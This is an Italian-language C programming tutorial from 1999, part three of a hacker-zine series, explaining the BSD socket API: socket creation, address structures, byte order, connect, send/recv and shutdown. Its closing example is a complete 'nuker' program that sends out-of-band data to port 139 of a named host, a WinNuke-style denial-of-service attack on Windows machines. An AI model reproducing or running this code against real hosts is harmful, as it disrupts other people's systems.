@@ -1,0 +1,234 @@
+                                             ีอออออออออออออออออออออออออออออออธ
+                                             ณ  :::::::::::::::::::::::::::  |
+                                             ฦอออออออออออออออออออออออออออออออต
+                                             ณ Titolo: Corso di C - III Parteณ
+                                             ฦอออออออออออออออออออออออออออออออต
+                                             ณ di : Techno Knight            ณ
+                                             ฦอออออออออออออออออออออออออออออออต
+                                             ณ Scritto il  : 21/4/99         ณ
+                                             ฦอออออออออออออออออออออออออออออออต
+                                             ณ Pericolo: Ûฐฐฐฐฐฐฐฐฐ          ณ
+                                             ิอออออออออออออออออออออออออออออออพ
+
+
+T E C H N O  K N I G H T
+                                                
+		P R E S E N T A
+
+			   C O R S O   D I   C
+
+					I I I   P U N T A T A
+
+
+
+
+Stavolta parliamo dei...socket!
+
+Oramai dovreste avere un'idea generale del linguaggio e di come programmare in C,
+semplici applicazioni, dopo aver letto le prime due puntate di questo corso,
+riguardanti la prima la sintassi di base, e la seconda la gestione dei files,
+quindi stavolta tratteremo un argomento un po' piu' specifico.
+Dato che e' un argomento lunghetto lo divideremo in due puntate.
+Un socket altro non e' che un cazzariello che gestisce per noi le parti piu'
+a basso livello di una connessione, lasciandoci cosi' liberi di pensare al 
+programma e risparmiandoci un casino di fatica.
+Faro' riferimento a Unix e Linux ma in Windows non dovrebbe cambiare molto.   
+
+Ecco gli headers che dovrete includere nei vostri programmi per il supporto
+dei socket di base :
+
+	sys/socket.h
+	sys/types.h
+        netinet/in.h
+	netdb.h	
+
+Per Windows95 la libreria che si occupa della gestione dei socket e' wsock32.dll
+
+Un socket viene riconosciuto dal C per il suo descriptor. Proprio come un file
+infatti un socket ha un numero intero che lo identifica, e glielo assegniamo
+con la funzione socket, che usa la seguente sintassi :
+
+          int socket(int domain, int type, int protocol);
+ 
+
+Ecco le costanti piu' comuni da passare come domain :
+
+			AF_UNIX  (protocolli interni Unix)
+			AF_INET  (protocolli internet ARPA)
+			AF_ISO   (protocolli ISO)
+			
+
+Come type potete usare invece :
+		
+			SOCK_STREAM (TCP)
+			SOCK_DGRAM  (UDP)
+			SOCK_RAW    (Il programma stesso costruisce i pacchetti)
+
+
+Come protocol potete passare 0 in modo che scelga automaticamente quello + 
+adatto.
+L'int restituito sara' appunto il descriptor del socket che abbiamo appena
+creato.
+Poi dobbiamo comunicare al socket a quale indirizzo collegarsi e su quale porta
+e per farlo utilizziamo la struttura sockaddr, o meglio la struttura sockaddr_in
+con un cast.
+
+		struct sockaddr_in{
+			short sin_family;
+			short sin_port;
+			struct in_addr sin_addr
+		}
+
+sin_addr e' una struttura di tipo in_addr, cioe'...
+
+		struct in_addr{
+			long s_addr;	
+		}
+
+
+In sin_family potete schiaffarci AF_INET, sin_port e' la porta, e sin_addr e'
+....indovinate un po'.... esatto, l'indirizzo del server.
+
+Internet usa valori ordinati nel modo inverso a quello dei processori intel,
+(i cosiddetti host byte order e network byte order)
+quindi per inserire un valore in sin_port o sin_addr dovremo prima convertirlo,
+e possiamo farlo con queste funzioni :
+
+       unsigned long int htonl(unsigned long int hostlong);
+
+       unsigned short int htons(unsigned short int hostshort);
+
+       unsigned long int ntohl(unsigned long int netlong);
+
+       unsigned short int ntohs(unsigned short int netshort);
+ 
+
+il cui significato mi sembra abbastanza ovvio (se non dovesse esserlo vi
+bastera' scrivere "man htonl" per avere una descrizione piu' dettagliata)
+
+In sin_addr non va inserito ovviamente l'indirizzo alfanumerico, ma l'ip 
+numerico.
+Per trovare l'ip numerico di uno alfanumerico usiamo la funzione :
+
+
+		     struct hostent *gethostbyname(char *name);
+
+
+name e' la stringa che rappresenta l'indirizzo alfanumerico.
+La funzione restituisce un puntatore a una struttura hostent. 
+L'ip che ci interessa e' contenuto nella struttura puntata dal valore
+di ritorno di gethostbyname, nel campo char *h_addr.
+
+Una volta che abbiamo creato il socket dobbiamo connetterlo, e lo possiamo
+fare con la funzione :
+
+
+       int  connect(int  sockfd, struct sockaddr *serv_addr, int addrlen );
+
+
+sockfd e' il descriptor del socket (il valore di ritorno della funzione socket)
+serv_addr e' la struttura sockaddr che contiene l'indirizzo e la porta,
+addrlen e' la dimensione di serv_addr
+
+Il valore di ritorno e' 0 in caso di successo.
+
+Per scrivere ad un socket (spedire dati quindi) si puo' usare la funzione
+write :
+
+		int write (int sockfd, char *buffer, int buflen);
+
+sockfd e' il descriptor del socket
+buffer punta al primo carattere della stringa da inviare
+buflen e' il numero di bytes da scrivere.
+
+Per leggere invece (ricevere dati quindi) si usa la stessa sintassi, ma con
+la funzione read ( int read (int sockfd, char *buffer, int buflen); ), solo
+che stavolta buffer punta al primo byte della memoria dove si vogliono salvare
+i dati letti, e buflen sono i caratteri da leggere.
+
+Queste due funzioni si basavano sul fatto che il socket e' rappresentato
+fondalmente come un intero, quindi possiamo usare il suo descriptor come se
+fosse un file. Ci sono pero' due funzioni che fanno la stessa cosa, ma che
+sono specifiche per i socket :
+
+       int recv(int s, void *buf, int len, unsigned int flags);
+       int  send(int s,  const  void *msg, int len, unsigned int flags);
+
+	
+vabbe' s e' il descriptor, ecc. ecc. 
+I flag li potete settare a zero oppure potete usare le seguenti costanti :
+
+		MSG_OOB (out of band)
+		MSG_DONTROUTE
+
+
+Alla fine quando dobbiamo chiudere il socket usiamo 
+
+	shutdown(int socket, int mode);
+
+dove mode e' un valore da 0 a 2 (0 chiude le operazioni di scrittura ma continua
+a ricevere, 1 continua solo a trasmettere, 2 viene chiuso del tutto)
+
+E poi per liberare le risorse utilizzate dal socket : closesocket (int socket);
+
+
+E adesso che vi sarete rotti il cazzo finalmente un esempio!
+Un semplice nuker.
+
+#include <stdio.h>
+#include <string.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+#define porta 139    // La classica vittima del nuke
+
+main(int argc, char *argv[]){
+
+char *stringa = "sAmPEi";
+struct sockaddr_in indirizzo;
+struct hostent *hp;
+int socchett;
+
+
+	socchett = socket (PF_INET, SOCK_STREAM, 0); // Crea il socket
+		
+	hp = gethostbyname(argv[1]);	// Trova l'ip numerico
+
+	bzero((char *)&indirizzo,sizeof(indirizzo)); // Riempie di 0 la strutt.
+
+	bcopy(hp->h_addr, (char *)&indirizzo.sin_addr, hp->h_length);
+	// Il segno -> indica il membro della struttura puntata. Ad esempio
+	// se ho una struttura di nome computer,con un campo chiamato CPU,
+	// e un puntatore alla struttura (*computer) chiamato computerp, e'
+	// la stessa cosa fare "computer.CPU = 486" o "computerp->CPU = 486"
+
+	indirizzo.sin_family = AF_INET;
+	indirizzo.sin_port = htons(porta);
+
+	connect(socchett,(struct sockaddr *)&indirizzo,sizeof(indirizzo));
+	// Dato che abbiamo riempito una struttura di tipo sockaddr_in ma
+	// connect richiede una di tipo sockaddr, allora utilizziamo un cast
+
+	send (socchett, stringa, strlen(stringa), MSG_OOB);
+	// Mandiamo una stringa out of band sulla 139 per nukkare
+
+	close(socchett);
+
+
+}
+
+
+Il programma prende l'indirizzo alfanumerico passatogli sulla riga di comando
+trova l'ip numerico e invia una stringa OOB sulla 139.
+
+Ok, il discorso sui socket e' lungo, lo finisco la prossima volta.
+Cya         
+
+
+                                Techno Knight       
+
+		
+
